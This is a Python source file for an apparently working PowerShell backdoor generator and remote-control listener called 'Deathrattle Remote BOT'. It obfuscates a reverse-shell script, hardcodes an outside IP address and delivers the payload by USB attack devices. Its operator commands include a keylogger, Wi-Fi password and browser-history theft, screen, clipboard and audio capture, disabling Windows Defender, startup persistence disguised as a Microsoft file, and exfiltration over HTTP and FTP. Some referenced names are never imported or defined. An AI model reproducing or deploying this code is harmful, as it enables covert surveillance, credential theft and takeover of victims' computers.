import os
import time
import socket
import argparse
import ftplib
from core.utils import *
from core.config import Config
from core.payloads.payload import fetch
from http.server import BaseHTTPRequestHandler, HTTPServer

BLOCKSIZE = 65536
READ_AMOUNT = 50 * 1024

CWD = os.getcwd() + "//"

POWERSHELL_SCRIPT_OBJECTS = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computerName",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
    "content",
    "readCount",
    "createPrompt",
    "readFromStream",
    "getCommand",
    "waitForConnection",
    "nothingtolookatreally",
    "BackdoorManager",
    "createTextStream",
    "command",
    "bytes",
    "powershellException",
    "msg",
]


class Client:
    def __init__(self, connection_tuple: tuple, config) -> None:
        self.config = config
        self.connection = connection_tuple[0]
        self.address = connection_tuple[1]
        self.features = {
            "get_tools": self.get_tools,
            "get_file": self.download_remote_file,
            "get_loot": self.get_loot,
            "print_help": self.print_help,
            "get_users": self.get_users,
            "get_os": self.get_os,
            "get_bios": self.get_bios,
            "get_antivirus": self.get_antivirus,
            "get_active": self.get_active,
            "install_choco": self.install_choco,
            "play_wav": self.play_wav,
            "start_keylogger": self.start_keylogger,
            "capture_screenshot": self.capture_screenshot,
            "list_processes": self.list_processes,
            "start_process": self.start_process,
            "stop_process": self.stop_process,
            "capture_clipboard": self.capture_clipboard,
            "get_system_info": self.get_system_info,
            "get_network_info": self.get_network_info,
            "upload_file": self.upload_file,
            "copy_file_to_path": self.copy_file_to_path,
            "remove_file_from_path": self.remove_file_from_path,
            "retrieve_browser_history": self.retrieve_browser_history,
            "retrieve_wifi_passwords": self.retrieve_wifi_passwords,
            "record_audio": self.record_audio,
            "disable_windows_defender": self.disable_windows_defender,
            "scan_open_ports": self.scan_open_ports,
            "list_running_services": self.list_running_services,
            "print_temp_folder_content": self.print_temp_folder_content,
            "print_folder_content": self.print_folder_content,
            "script_autostart": self.script_autostart,
            "delete_from_startup": self.delete_from_startup,
            "power_command": self.power_command,
            "capture_screenshot_large": self.capture_screenshot_large,
            "upload_file_to_http": self.upload_file_to_http,
            "get_public_ip": self.get_public_ip,
            "copy_file_to_temp": self.copy_file_to_temp,
        }

    def get_public_ip(self, command=None) -> None:
            """Fetch the public IP address of the remote machine."""
            ipify_command = 'Invoke-RestMethod -Uri "https://api.ipify.org?format=text"'
            print("Fetching public IP address...")
            self.run_powershell_command(ipify_command)

    def upload_file_to_http(self, command):
        try:
            # Extract filename and target IP address from the command
            parts = command.split(" ")
            if len(parts) != 4:
                print("Usage: upload_file_to_http <FILENAME> <TARGET_IP> <PORT>")
                return

            filename = parts[1]
            target_ip = parts[2]
            port = parts[3]

            # Set the file path using the TEMP environment variable on the target machine
            file_path = f"$env:TEMP\\{filename}"
            # Define the HTTP server URL, using port 14500
            http_server_url = f"http://{target_ip}:{port}/upload"
            print("{http_server_url}")
            # PowerShell script for HTTP file upload
            upload_script = f"""
            $filePath = "{file_path}"
            $fileName = [System.IO.Path]::GetFileName($filePath)
            $httpServerUrl = "{http_server_url}"

            Write-Host "Uploading $filePath to HTTP server $httpServerUrl"

            # Read file bytes
            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

            # Create HTTP request
            $httpRequest = [System.Net.HttpWebRequest]::Create($httpServerUrl)
            $httpRequest.Method = "POST"
            $httpRequest.ContentType = "application/octet-stream"
            $httpRequest.Headers.Add("Filename", $fileName)
            $httpRequest.ContentLength = $fileBytes.Length

            # Write file bytes to request stream
            $requestStream = $httpRequest.GetRequestStream()
            $requestStream.Write($fileBytes, 0, $fileBytes.Length)
            $requestStream.Close()

            # Get HTTP response
            $httpResponse = $httpRequest.GetResponse()
            $httpResponse.Close()

            Write-Host "File uploaded successfully"
            """
            
            self.run_powershell_command(upload_script, print_result=True)
            print("File upload script executed.")
        except IndexError:
            print("Usage: upload_file_to_http <FILENAME> <TARGET_IP> <PORT>")
        except Exception as e:
            print(f"Failed to upload file to HTTP server: {e}")

    def run_powershell_command(self, command: str, print_result: bool = True) -> None:
        self.connection.sendto(command.encode(), self.config.ip_tuple)
        if print_result:
            print(format_string(self.recvall()))


    def get_loot(self, command) -> None:
        try:
            directory = command.split(" ")[1]
            command = f"Get-ChildItem -Path {directory} -Recurse -Include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt, *.db, *.exe | Select-Object FullName | Out-String"
            self.run_powershell_command(command)
        except IndexError:
            print("Usage: get_loot <DIR>")

        
    def get_users(self, command=None) -> None:
        command = "Get-LocalUser | Select * | Out-String"
        self.run_powershell_command(command)

    def get_bios(self, command=None) -> None:
        command = "Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String"
        self.run_powershell_command(command)

    def get_active(self, command=None) -> None:
        command = "Get-NetTCPConnection -State Listen  | Out-String"
        self.run_powershell_command(command)

    def get_os(self, command=None) -> None:
        command = "Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String"
        self.run_powershell_command(command)

    def get_antivirus(self, command=None) -> None:
        command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
        self.run_powershell_command(command)

    def install_choco(self, command=None) -> None:
        command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
        self.run_powershell_command(command)

    def script_autostart(self, command=None):
        try:
            autostart_script = """
$tempPath = [System.IO.Path]::GetTempPath()
$shellStartupPath = [Environment]::GetFolderPath("Startup")
Copy-Item -Path $tempPath\MicrosoftServices.vbs -Destination $shellStartupPath -Force
"""
            self.run_powershell_command(autostart_script)
            print("Script successfully added to startup.")
        except Exception as e:
            print(f"Failed to add script to startup: {e}")

    def delete_from_startup(self, command=None) -> None:
        try:
            delete_script = f"""
$tempPath = [System.IO.Path]::GetTempPath()
$shellStartupPath = [Environment]::GetFolderPath("Startup")
$filePath = Join-Path -Path $shellStartupPath -ChildPath "MicrosoftServices.vbs"
Remove-Item -Path $filePath -Force
"""
            self.run_powershell_command(delete_script)
            print(f"File successfully deleted from Startup folder.")
        except Exception as e:
            print(f"Failed to delete file from Startup folder: {e}")

    def print_temp_folder_content(self, command=None):
        temp_folder_script = """
        $tempPath = [System.IO.Path]::GetTempPath()
        Get-ChildItem -Path $tempPath | Select-Object Name, Length, LastWriteTime | Out-String
        """
        self.run_powershell_command(temp_folder_script, print_result=True)



    def print_folder_content(self, command):
        try:
            folder_path = command.split(" ")[1]
            temp_folder_script = f"""
            Get-ChildItem -Path "{folder_path}" | Select-Object Name, Length, LastWriteTime | Out-String
            """
            self.run_powershell_command(temp_folder_script, print_result=True)
        except IndexError:
            print("Usage: print_folder_content <FOLDER_PATH>")
        except Exception as e:
            print(f"Failed to list folder content: {e}")

    def play_wav(self, command) -> None:
        try:
            remote_file = command.split(" ")[1]
            duration = int(command.split(" ")[2])
        except:
            self.__send_fake_request()
            return
        out_file = "$env:TEMP\\tmpSound.wav"
        download_command = f'Invoke-WebRequest -URI {remote_file} -OutFile "{out_file}"'
        self.run_powershell_command(download_command, print_result=False)
        play_command = f'(New-Object System.Media.SoundPlayer("{out_file}")).PlaySync()'
        self.run_powershell_command(play_command, print_result=False)
        time.sleep(duration + 1)
        delete_command = f'remove-item -Path "{out_file}" -Force'
        self.run_powershell_command(delete_command, print_result=False)

    def start_keylogger(self, command=None):
        print(
            "[*] Listing... the file is in the targer maching %temp% folder keylog.txt"
        )
        keylogger_script = """
$logFile = "$env:TEMP\\keylog.txt"
$signature = @"
[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
public static extern short GetAsyncKeyState(int vKey);
"@
Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace 'WinAPI'

while ($true) {
    Start-Sleep -Milliseconds 10
    foreach ($key in 1..255) {
        $state = [WinAPI.Win32]::GetAsyncKeyState($key)
        if ($state -eq -32767) {
            $keyChar = [char]$key
            Add-Content -Path $logFile -Value $keyChar
        }
    }
}
"""
        self.run_powershell_command(keylogger_script, print_result=False)


    def capture_screenshot(self, command=None):
        screenshot_script = """
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height
    $Graphics = [Drawing.Graphics]::FromImage($Bitmap)
    $Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size)
    $Bitmap.Save("$env:TEMP\\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
    """
        self.run_powershell_command(screenshot_script, print_result=False)

    def capture_screenshot_large(self, command=None):
        screenshot_script = """
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Width = 1920
    $Height = 1080
    $Bitmap = New-Object Drawing.Bitmap $Width, $Height
    $Graphics = [Drawing.Graphics]::FromImage($Bitmap)
    $Graphics.CopyFromScreen(0, 0, 0, 0, New-Object System.Drawing.Size $Width, $Height)
    $Bitmap.Save("$env:TEMP\\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
    """
        self.run_powershell_command(screenshot_script, print_result=False)
        screenshot_path = os.path.join(os.environ['TEMP'], 'screenshot.png')
        if os.path.exists(screenshot_path):
            print(f"Screenshot saved successfully to: {screenshot_path}")
        else:
            print("Failed to save the screenshot.")


    def list_processes(self, command=None):
        self.run_powershell_command("Get-Process | Out-String")


    def retrieve_wifi_passwords(self, command=None):
        wifi_script = """
        $wifiProfiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
            $_ -match 'All User Profile\\s*:\\s*(.+)$'
            $matches[1]
        }
        
        $wifiProfiles | ForEach-Object {
            $profile = $_
            $profileInfo = netsh wlan show profile name="$profile" key=clear
            $password = ($profileInfo | Select-String 'Key Content\\s*:\\s*(.+)$').Matches.Groups[1].Value
            [PSCustomObject]@{Profile=$profile;Password=$password}
        } | Out-File -FilePath $env:TEMP\\wifi_passwords.txt
        """
        self.run_powershell_command(wifi_script, print_result=False)

    def retrieve_browser_history(self, command=None):
        browser_history_script = """
        function Get-ChromeHistory {
            $dbPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google\\Chrome\\User Data\\Default\\History')
            $query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10"
            $connectionString = "Data Source=$dbPath; Version=3; New=True;"
            $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
            $connection.Open()
            $command = $connection.CreateCommand()
            $command.CommandText = $query
            $reader = $command.ExecuteReader()
            $results = @()
            while ($reader.Read()) {
                $results += [PSCustomObject]@{
                    URL = $reader["url"]
                    Title = $reader["title"]
                    VisitCount = $reader["visit_count"]
                    LastVisitTime = $reader["last_visit_time"]
                }
            }
            $connection.Close()
            return $results
        }
        Get-ChromeHistory | Out-File -FilePath $env:TEMP\\chrome_history.txt
        """
        self.run_powershell_command(browser_history_script, print_result=False)

    def start_process(self, command):
        process_name = command.split(" ")[1]
        self.run_powershell_command(f"Start-Process {process_name}")

    def stop_process(self, command):
        process_name = command.split(" ")[1]
        self.run_powershell_command(f"Stop-Process -Name {process_name}")

    def capture_clipboard(self, command=None):
        clipboard_script = """
        Add-Type -AssemblyName PresentationCore
        [Windows.Clipboard]::GetText()
        """
        self.run_powershell_command(clipboard_script)

    def get_system_info(self, command=None):
        self.run_powershell_command("Get-ComputerInfo | Out-String")

    def get_network_info(self, command=None):
        self.run_powershell_command("Get-NetAdapter | Out-String")
        self.run_powershell_command("Get-NetIPConfiguration | Out-String")

    def upload_file(self, command):
        remote_file = command.split(" ")[1]
        local_file = command.split(" ")[2]
        upload_command = f"curl -T {local_file} ftp://{self.config.ftp_server}/{remote_file} --user {self.config.ftp_user}:{self.config.ftp_password}"
        self.run_powershell_command(upload_command)

    def copy_file_to_path(self, command):
        file_path = command.split(" ")[1]
        dest_path = command.split(" ")[2]
        # PowerShell-like function to copy a file to a specified destination
        try:
            copy_script = f"Copy-Item -Path '{file_path}' -Destination '{dest_path}' -Force"
            self.run_powershell_command(copy_script)
        except Exception as e:
            print(f"Failed to copy file from {file_path} to {dest_path}: {e}")

    def copy_file_to_temp(self, command):
        try:
            # Extract the filename from the command
            filename = command.split(" ")[1]

            # PowerShell script to copy the file from the current directory to TEMP
            copy_script = f"""
            $currentDir = Get-Location -ErrorAction Stop
            $tempDir = [System.IO.Path]::GetTempPath()
            $sourcePath = Join-Path -Path $currentDir -ChildPath "{filename}"
            $destPath = Join-Path -Path $tempDir -ChildPath "{filename}"

            Write-Host "Copying file from $sourcePath to $destPath"

            # Copy the file to the TEMP directory
            Copy-Item -Path $sourcePath -Destination $destPath -Force -ErrorAction Stop

            Write-Host "File copied successfully to TEMP"
            """

            # Send the PowerShell script to the target machine for execution
            self.run_powershell_command(copy_script, print_result=True)
            print("File copy script executed successfully.")
        except IndexError:
            print("Usage: copy_file_to_temp <FILENAME>")
        except Exception as e:
            print(f"Failed to copy file to TEMP folder: {e}")

    def remove_file_from_path(self, command):
        file_path = command.split(" ")[1]
        # PowerShell-like function to remove a file from a specified path
        try:
            remove_script = f"Remove-Item -Path '{file_path}' -Force"
            self.run_powershell_command(remove_script)
        except Exception as e:
            print(f"Failed to remove file {file_path}: {e}")

    def print_help(self, command=None):
        help_message = """
        Command                Description

        get_antivirus          - Gets information about Windows Defender
        get_os                 - Gets information about the current OS build
        get_active             - Lists active TCP connections
        get_bios               - Gets the BIOS's manufacturer name, bios name, and firmware type
        get_public_ip          - Makes a network request to api.ipify.org to return the computer's public IP address
        get_loot               - Searches a directory for interesting files (Syntax: get_loot <DIR>)
        get_tools              - Checks to see what tools are installed on the system
        get_file               - Downloads a remote file and saves it to your computer (Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>)
        get_users              - Lists all users on the local computer
        install_choco          - Installs Chocolatey package manager (Requires Admin)
        play_wav               - Plays a WAV file from a specified URL (Syntax: play_wav <URL> <DURATION>)
        start_keylogger        - Starts a keylogger to capture keystrokes
        list_processes         - Lists all running processes
        start_process          - Starts a process (Syntax: start_process <PROCESS_NAME>)
        stop_process           - Stops a process (Syntax: stop_process <PROCESS_NAME>)
        get_system_info        - Gets detailed system information
        get_network_info       - Gets network adapter and IP configuration information
        upload_file            - Uploads a file to a remote server (Syntax: upload_file <LOCAL_FILE> <REMOTE_FILE>)
        copy_file_to_path        - copy_file_to_path <file path> <destination>
        remove_file_from_path     - remove file from <path>
        retrieve_browser_history   - Retrieves browser history from Google Chrome and saves it to the TEMP folder
        retrieve_wifi_passwords    - Retrieves saved WiFi passwords and saves them to the TEMP folder
        record_audio               - record audio file to temp folder Usage: record_audio <DURATION>
        disable_windows_defender   - disable windows defender
        scan_open_ports            - scan for open port Usage: scan_open_ports <IP_RANGE>
        list_running_services      - list all running services
        capture_screenshot     - Captures a screenshot of the current screen
        capture_screenshot_large - take screenshot 1920 x 1080
        capture_clipboard      - Captures the current clipboard text
        print_folder_content        - Prints the content of specified folder (Usage: execute_command <PATH>)
        print_temp_folder_content      - Prints the content of the TEMP folder
        script_autostart               - add script to windows autostart folder
        delete_from_startup            - delete script from startup
        power_command                 -print list of power shell command
        upload_file_to_http           - upload file from target to attacker -filepath -server ip
        get_public_ip                - Get target public IP
        copy_file_to_temp            -copy filename from current folder to target temp for extraction
        """
        print(help_message)
        self.__send_fake_request()

    def power_command(self, command=None):
        power_message = """
        Command                Description

        get_temp_path                - Retrieves the path to the directory where temporary files are stored
        get_desktop_path             - Retrieves the path to the current user's Desktop folder
        list_special_folders         - Lists all special folders available through GetFolderPath
        list_directory_content       - Lists files and directories in a specified directory (Usage: list_directory_content <PATH>)
        copy_file                    - Copies a file from a source path to a destination path (Usage: copy_file <SOURCE_PATH> <DESTINATION_PATH>)
        move_file                    - Moves a file from a source path to a destination path (Usage: move_file <SOURCE_PATH> <DESTINATION_PATH>)
        create_new_directory         - Creates a new directory at the specified path (Usage: create_new_directory <DIRECTORY_PATH>)
        delete_file                  - Deletes a file specified by its path (Usage: delete_file <FILE_PATH>)
        start_process                - Starts a new process, such as opening an application (Usage: start_process <APPLICATION_PATH>)
        download_from_web            - Downloads content from a web URI and saves it as a file (Usage: download_from_web <URL> <DESTINATION_PATH>)
        """
        print(power_message)
        self.__send_fake_request()

    def get_tools(self, command=None):
        tools = [
            "nmap -V",
            "nc -h",
            "wireshark -v",
            "python3 -V",
            "git -V",
            "python -V",
            "perl -V",
            "ruby -h",
            "hashcat -h",
            "john -h",
            "airmon-ng -h",
            "wifite -h",
            "sqlmap -h",
            "ssh -V",
            "gdb -h",
            "radare2 -h",
            "dig -h",
            "whois -h",
            "gcc -v",
            "g++ -v",
            "make -v",
            "zip -h",
            "unzip -h",
            "tcpdump -h",
            "nikto -h",
            "dirb -h",
            "hydra -h",
            "nbtscan -h",
            "netcat -h",
            "recon-ng -h",
            "sublist3r -h",
            "amass -h",
            "masscan -h",
            "sqlninja -h",
            "metasploit --version",
            "aircrack-ng -h",
            "ettercap -h",
            "dsniff -h",
            "driftnet -h",
            "tshark --version",
        ]
        print("[*] Listing Installed tools below")
        for tool in tools:
            content = None
            self.connection.sendto(tool.encode(), self.config.ip_tuple)
            while not isinstance(content, str):
                time.sleep(0.5)
                content = format_string(self.recvall())
            if " is not recognized as the name of a cmdlet, " in content:
                continue
            if " " in tool:
                tool = tool.split(" ")[0]
            print(tool)
        self.__send_fake_request()

    def get_public_ip(self, command=None) -> None:
        self.connection.sendto(
            '(Invoke-WebRequest -UseBasicParsing -uri "https://api.ipify.org/").Content | Out-String'.encode(),
            self.config.ip_tuple,
        )
        print(format_string(self.recvall()))

    def __send_fake_request(self) -> None:
        self.connection.sendto("ls | Out-Null".encode(), self.config.ip_tuple)

    def scan_open_ports(self, command):
        try:
            ip_range = command.split(" ")[1]
            port_scan_script = f"""
            Test-NetConnection -ComputerName {ip_range} -Port 1..65535 | Where-Object {{$_.TcpTestSucceeded}} | Out-String
            """
            self.run_powershell_command(port_scan_script, print_result=True)
        except IndexError:
            print("Usage: scan_open_ports <IP_RANGE>")

    def list_running_services(self, command=None):
        services_script = """
        Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-String
        """
        self.run_powershell_command(services_script, print_result=True)

    def record_audio(self, command):
        try:
            duration = int(command.split(" ")[1])
            audio_script = f"""
            $recording = New-Object -ComObject soundrecorder.soundrecorder
            $recording.recordduration = {duration}
            $recording.filename = "$env:TEMP\\audio_recording.wav"
            $recording.record()
            """
            self.run_powershell_command(audio_script, print_result=False)
        except IndexError:
            print("Usage: record_audio <DURATION>")
        except Exception as e:
            print(f"Failed to record audio: {e}")

    def disable_windows_defender(self, command=None):
        defender_script = """
        Set-MpPreference -DisableRealtimeMonitoring $true
        """
        self.run_powershell_command(defender_script, print_result=False)

    def download_remote_file(self, command) -> bool:
        try:
            remote_file = command.split(" ")[1]
            local_file = command.split(" ")[2]
            command = f"Invoke-WebRequest -Uri {remote_file} -OutFile {local_file}"
            self.run_powershell_command(command)
        except IndexError:
            print("Usage: get_file <REMOTE_FILE> <LOCAL_FILE>")

    def recvall(self) -> bytes:
        data: bytes = b""
        while True:
            part = self.connection.recv(READ_AMOUNT)
            data += part
            if len(part) < READ_AMOUNT:
                break
        return data

    def process_additional_feature(self, command):
        command_function_requested = command
        if " " in command:
            command_function_requested = command.split(" ")[0]
        command_function = self.features.get(command_function_requested)
        if not command_function:
            return False
        command_function(command)
        return True


class Backdoor:
    def __init__(self, config: Config) -> None:
        self.config = config
        self.sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def handle_usb_payload(self) -> None:
        payload = None
        if self.config.payload:
            payload = fetch(self.config.payload, self.config)
        if not payload and (self.config.ducky or self.config.flipper):
            return False
        elif not payload:
            return True
        self.start_threaded_http_server()
        result = payload.execute()
        if not result:
            payload.stop()
        return result

    def create_backdoor(self) -> None:
        if not self.obfuscate_backdoor():
            self.print_verbose_message("Failed to encode backdoor", prefix="-")
            exit()
        hash = get_sha1_file_hash(self.config.out_file)
        self.print_verbose_message(f"Saved backdoor {self.config.out_file} sha1:{hash}")
        if self.config.flipper or self.config.ducky:
            if not self.handle_usb_payload():
                self.print_verbose_message(
                    f"Failed to process payload: {self.config.payload}", prefix="-"
                )
                exit()

    def __just_one_please(self) -> None:
        self.httpd.handle_request()
        print(f"[*] Stopping HTTP server")
        self.httpd.shutdown()

    def start_threaded_http_server(self) -> None:
        self.httpd = socketserver.TCPServer(
            self.config.server_ip_tuple, SimpleHTTPRequestHandler
        )
        thread = Thread(target=self.__just_one_please)
        thread.daemon = True
        thread.start()
        print(
            f"[*] Started HTTP server hosting directory http://93.93.112.55:{self.config.server_port}/ "
        )

    def start_session(self) -> None:
        print(
            f"[*] Starting Backdoor Listener 93.93.112.55:{self.config.port} use CTRL+BREAK to stop"
        )
        self.sock.bind(self.config.ip_tuple)
        while True:
            self.sock.listen(1)
            client = Client(self.sock.accept(), self.config)
            if self.config.force and client.address[0] != self.config.force:
                self.print_verbose_message(
                    f"Skipping connection from {client.address[0]}:{client.address[1]} (--force was specified)"
                )
                continue

            self.print_verbose_message(
                f"Recieved connection from {client.address[0]}:{client.address[1]}"
            )
            self.handle_client(client)

    def obfuscate_backdoor(self) -> bool:
        self.print_verbose_message(f"Encoding backdoor script")
        backdoor = get_file_content(self.config.BACKDOOR_TEMPLATE)
        if not backdoor:
            return False
        for powershell_object in POWERSHELL_SCRIPT_OBJECTS:
            backdoor = obfuscate(backdoor, powershell_object)

        backdoor = backdoor.replace("4444", str(self.config.port))
        backdoor = backdoor.replace("0.0.0.0", "93.93.112.55")
        return save_content_to_file(backdoor, self.config.out_file)

    def handle_client(self, client) -> None:
        LOGO = """

          
                         \  /
                          \/
                .===============.
                | .-----------. |
                | |           | |
                | |Deathrattle| |
                | |Remote BOT | |   __
                | '-----------'o|  |o.|
                |===============|  |::|
                |###############|  |::|
                '==============='  '--'                                                                                
                

"""
        print(LOGO)
        try:
            while True:
                time.sleep(0.5)
                prompt = format_string(client.recvall())

                command = input(f"{prompt.strip()} ")

                if len(command) == 0:
                    command += "ls | Out-Null"

                time.sleep(0.5)
                if not client.process_additional_feature(command):
                    client.run_powershell_command(command)

        except ConnectionResetError:
            return

    def print_verbose_message(self, message: str, prefix: str = "*") -> None:
        if self.config.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def stop(self) -> None:
        self.remove_persistence()  # Remove persistence on exit
        self.sock.close()

    def start(self) -> None:
        if not self.config.just_listen_and_host and not self.config.just_listen:
            self.create_backdoor()
        elif self.config.just_listen_and_host:
            self.start_threaded_http_server()
        self.start_session()


def main(args) -> None:
    try:
        config = Config(CWD, **vars(args))
        if config.list_payloads:
            show_help()
            exit()
        l = Backdoor(config)
        l.start()
    except KeyboardInterrupt:
        l.stop()
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        l.stop()
        exit(f"Exiting! {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor Generator")
    parser.add_argument(
        "--ip-address",
        "-i",
        help=f"IP Address to bind the backdoor too (default: {get_ip_address()})",
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port for the backdoor to connect over (default: 4444)",
        default=4444,
        type=int,
    )
    parser.add_argument(
        "--random",
        "-r",
        help=f"Randomizes the outputed backdoor's file name",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--out",
        "-o",
        help=f"Specify the backdoor filename (relative file names)",
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help=f"Show verbose output",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--delay",
        help=f"Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)",
        default=100,
    )
    parser.add_argument(
        "--flipper",
        help=f"Payload file for flipper zero (includes EOL conversion) (relative file name)",
    )
    parser.add_argument(
        "--ducky",
        help=f"Creates an inject.bin for the http server",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--server-port",
        help=f"Port to run the HTTP server on (--server) (default: 8080)",
        default=8080,
    )
    parser.add_argument(
        "--payload",
        help=f"USB Rubber Ducky/Flipper Zero backdoor payload to execute",
    )
    parser.add_argument(
        "--list-payloads",
        help=f"List all available payloads",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "-k",
        "--keyboard",
        help=f"Keyboard layout for Bad Usb/Flipper Zero (default: us)",
        default="us",
    )
    parser.add_argument(
        "-A",
        "--actually-listen",
        help=f"Just listen for any backdoor connections",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "-H",
        "--listen-and-host",
        help=f"Just listen for any backdoor connections and host the backdoor directory",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "-f",
        "--force",
        help=f"Specify what IP address to receive a backdoor connection from",
    )
    args = parser.parse_args()
    main(args)


    


